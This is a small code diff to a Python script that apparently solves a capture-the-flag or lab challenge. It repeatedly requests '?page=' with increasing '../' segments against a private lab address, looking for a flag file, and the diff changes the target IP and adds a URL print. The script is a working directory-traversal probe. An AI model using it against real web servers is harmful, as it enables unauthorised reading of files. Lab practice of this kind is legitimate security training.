@@ -4,10 +4,10 @@ def try_directory(path: str, max: int = 20):
     for i in range(max):
         page = '/'.join(['..'] * i) + '/' + path
 
-        response = requests.get(f'http://192.168.56.2/?page={page}')
+        response = requests.get(f'http://192.168.56.102/?page={page}')
 
         script = response.text.partition('\n')[0].split("'")[1::2]
-
+        print(response.url)
         if len(script) > 0 and script[0].find("flag") != -1:
             return script[0]
 
